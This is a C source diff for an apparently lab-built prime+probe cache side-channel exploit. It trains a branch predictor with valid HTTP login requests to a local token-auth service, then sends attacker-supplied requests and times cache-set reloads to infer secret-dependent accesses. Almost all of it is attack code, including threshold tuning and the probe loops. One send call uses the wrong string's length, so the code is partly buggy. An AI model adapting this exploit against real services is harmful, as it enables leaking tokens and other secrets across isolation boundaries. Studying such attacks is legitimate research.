@@ -21,7 +21,7 @@
 
 
 // prime+probe
-#define TRAINING_REPS 100
+#define TRAINING_REPS 10
 #define ATTACK_RUNS 10000
 #define BASELINE_RUNS 10000
 #define EVICTION_THRESHOLD 0
@@ -58,7 +58,7 @@ int main(int argc, char* argv[]) {
 
 
     // find threshold
-    c_threshold = 140;//cache_threshold(); // or set ~100
+    c_threshold = 95;//cache_threshold(); // or set ~100
 
     // prep attack and training data for request
     char *valid_data = 
@@ -68,42 +68,78 @@ int main(int argc, char* argv[]) {
     "Content-Type: application/x-www-form-urlencoded\r\n"
     "Connection: keep-alive\r\n"
     "\r\n"
-    "username=user1&password=password&id=0";
+    "username=user1&password=password&id=0000";
+    char *baseline_data = 
+    "POST /token-auth/ HTTP/1.1\r\n"
+    "Host: 127.0.0.1\r\n"
+    "Content-Length: 37\r\n"
+    "Content-Type: application/x-www-form-urlencoded\r\n"
+    "Connection: keep-alive\r\n"
+    "\r\n"
+    "username=user1&password=password&id=4100";
     char attack_data[256];
     get_inputs(attack_data, argc, argv);
     
-    // warm cache?
-  /*   int trash[SETS] = {0};    
-    for(int i = 0; i < BASELINE_RUNS; i++){
-        for(int i = 0; i < TRAINING_REPS; i++){
-            make_request(valid_data, &clientfd);
-        }
-        primeprobe(valid_data, &clientfd, trash);
-    }
- */
+    char buf[1024];
     int baseline[SETS] = {0}; 
-  /*   // generates baseline set
-       
-    for(int i = 0; i < BASELINE_RUNS; i++){
-        for(int i = 0; i < TRAINING_REPS; i++){
-            make_request(valid_data, &clientfd);
-        }
-        primeprobe(valid_data, &clientfd, baseline);
-    }
- */
     int count[SETS] = {0}; // records sets that have been touched
-    for (int j = 0; j < ATTACK_RUNS; j++) {
 
-        primeprobe(valid_data, &clientfd, baseline);    
+    // get page table entries in cache lookup
+    for (int i = 0; i < SETS; i++) {
+        for (int w = 0; w < WAYS; w++) {
+            volatile uint8_t *addr = &probe_array[(w * 4096) + (i * 64)];
+            uint8_t dummy = *addr; 
+        }
+    }
+    _mm_mfence();
+  
+    for (int j = 0; j < ATTACK_RUNS; j++) {
+       
+
         // Train BP
         for(int i = 0; i < TRAINING_REPS; i++){
             make_request(valid_data, &clientfd);
         }
-    
-        primeprobe(attack_data, &clientfd, count);
+
+        //prime
+        for (unsigned int i = 0; i < SETS; i++){
+            for(unsigned int w = 0; w < WAYS; w++){
+                volatile uint8_t tmp = probe_array[shuffle_arr[i] * LINE_SIZE + (w * 4096)];
+            }
+        }
+        _mm_mfence();
+
+        // send baseline
+        send(clientfd, baseline_data, strlen(attack_data), 0);
+        for (volatile int i = 0; i < 150; i++);
+        //probe
+        check_cache_presence(baseline);
+        //recv
+        recv(clientfd, buf, sizeof(buf), 0);
+
+
+        // = ATTACK =
+        // Train BP
+        for(int i = 0; i < TRAINING_REPS; i++){
+            make_request(valid_data, &clientfd);
+        }
+
+        //prime
+        for (unsigned int i = 0; i < SETS; i++){
+            for(unsigned int w = 0; w < WAYS; w++){
+                volatile uint8_t tmp = probe_array[shuffle_arr[i] * LINE_SIZE + (w * 4096)];
+            }
+        }
+        _mm_mfence();
+
+        // send attack
+        send(clientfd, attack_data, strlen(attack_data), 0);
+        for (volatile int i = 0; i < 150; i++);
+        //probe
+        check_cache_presence(count);
+        
+        recv(clientfd, buf, sizeof(buf), 0);
     } 
-
-
 
     printf("\n===== Eviction Difs =====\n");
     for (int i = 0; i < SETS; i++) { 
@@ -128,43 +164,47 @@ void shuffle(int shuffle_arr[]){
 
 void prime_cache(){
     // Prime L1 cache
-    for (int j = 0; j < 10; j++){
-        // loop through probe array - one iteration = one cache line hit (makes sure it persists in L1)
-        for (unsigned int i = 0; i < SETS; i++){
-            for(unsigned int w = 0; w < WAYS; w++){ // primes each way
-                volatile uint8_t tmp; 
-                tmp =  probe_array[shuffle_arr[i] * LINE_SIZE + (w * 4096)]; // forces load
-            }
+    // loop through probe array - one iteration = one cache line hit (makes sure it persists in L1)
+    for (unsigned int i = 0; i < SETS; i++){
+        for(unsigned int w = 0; w < WAYS; w++){ // primes each way
+            volatile uint8_t tmp; 
+            tmp =  probe_array[shuffle_arr[i] * LINE_SIZE + (w * 4096)]; // forces load
         }
     }
+    
 }
 
 
 void check_cache_presence(int *count){
     uint64_t t1, t2;
     unsigned int pid;
+    volatile uint8_t junk = 0;
     for (unsigned int i = 0; i < SETS; i++){
         int set = shuffle_arr[i]; // determine random set to probe
-        
-        for (int w = 0; w < WAYS; w ++){
-            uint8_t *addr = &probe_array[(set * LINE_SIZE) + (w * 4096)];
-
+        int wayEvictions = 0;
+        //for (int w = 0; w < WAYS; w ++){
+            //uint8_t *addr = &probe_array[(set * LINE_SIZE) + (w * 4096)];
             _mm_lfence();
-            t1 = __rdtscp(&pid);
+            t1 = __rdtscp(&pid); 
             _mm_lfence();
 
-            pid = *addr;
-
+            for (int w = 0; w < 4; w++) {
+                junk ^= probe_array[(w * 4096) + (set * 64) + (junk & 0)];
+            }
             _mm_lfence();
             t2 = __rdtscp(&pid);
             _mm_lfence();
                 
             if (t2 - t1 > c_threshold){ // if way evicted count one set eviction and move onto next set
                 count[set] ++;
-                break;
+                //wayEvictions +=1;    
+                //break;
 
             }
-        }
+        
+        // if (wayEvictions == 1){
+        //     count[set] ++;
+        // }
         
     }
     
@@ -177,71 +217,16 @@ void primeprobe(char *data, int *clientfd, int *results) {
     _mm_mfence(); // wait for prime to compelte before sending bad request
 
     send(*clientfd, data, strlen(data), 0);
-
-    // cache check 
+    for (volatile int i = 0; i < 100; i++); 
+    
     _mm_lfence();
-
     check_cache_presence(results);
 
     char buf[1024];
     recv(*clientfd, buf, sizeof(buf), 0); 
     _mm_mfence();
-}
-
-// finds hit and miss time  -need to implement loop to find avg + determine cache threshold
-volatile int test_data = 2;
-int cache_threshold(){
-    uint64_t t1, t2, time; 
-    uint64_t min = UINT64_MAX;
-    uint64_t max = 0;
-    unsigned int pid;
-
-    for (int i = 0; i < 1000; i++){
-        pid = test_data;
-        pid = test_data;
-
-        _mm_lfence();
-        t1 = __rdtscp(&pid);
-        _mm_lfence();
-
-        pid = test_data;
-
-        _mm_lfence();
-        t2 = __rdtscp(&pid);
-        _mm_lfence();
-
-        time = t2 - t1;
-        if (time > max){
-            max = time;
-        }
-    }
-
-
-    for (int i = 0; i < 1000; i++){
-        _mm_clflush((void*)&test_data);
-        _mm_mfence();
-
-        _mm_lfence();
-        t1 = __rdtscp(&pid);
-        _mm_lfence();
-
-        pid = test_data;
-
-        t2 = __rdtscp(&pid);
-        _mm_lfence();
-
-        time = t2 - t1;
-        if (min > time){
-            min = time;
-        }
-    }
     
-    uint64_t threshold = (min + max)/2;
-    printf("fastest miss: %ld\nslowest hit: %ld\n threshold: %ld", min, max, threshold);
-    return threshold;
 }
-
-
 // send request with curl request for token to microservice
 void make_request(char *data, int *clientfd){
     // curl_easy_setopt(curl_handle, CURLOPT_POSTFIELDS, data);
@@ -286,4 +271,59 @@ void open_socket(int *clientfd, struct sockaddr_in *servaddr){
     servaddr->sin_family = AF_INET;
     servaddr->sin_port = htons(PORT);
     servaddr->sin_addr.s_addr = inet_addr(INET);
+}
+
+
+
+// finds hit and miss time  -need to implement loop to find avg + determine cache threshold
+volatile int test_data = 2;
+int cache_threshold(){
+    uint64_t t1, t2, time; 
+    uint64_t min = UINT64_MAX;
+    uint64_t max = 0;
+    unsigned int pid;
+
+    for (int i = 0; i < 1000; i++){
+        pid = test_data;
+        pid = test_data;
+
+        _mm_lfence();
+        t1 = __rdtscp(&pid);
+        _mm_lfence();
+
+        pid = test_data;
+
+        _mm_lfence();
+        t2 = __rdtscp(&pid);
+        _mm_lfence();
+
+        time = t2 - t1;
+        if (time > max){
+            max = time;
+        }
+    }
+
+
+    for (int i = 0; i < 1000; i++){
+        _mm_clflush((void*)&test_data);
+        _mm_mfence();
+
+        _mm_mfence();
+        t1 = __rdtscp(&pid);
+        _mm_mfence();
+
+        pid = test_data;
+
+        t2 = __rdtscp(&pid);
+        _mm_mfence();
+
+        time = t2 - t1;
+        if (min > time){
+            min = time;
+        }
+    }
+    
+    uint64_t threshold = (min + max)/2;
+    printf("fastest miss: %ld\nslowest hit: %ld\n threshold: %ld", min, max, threshold);
+    return threshold;
 }
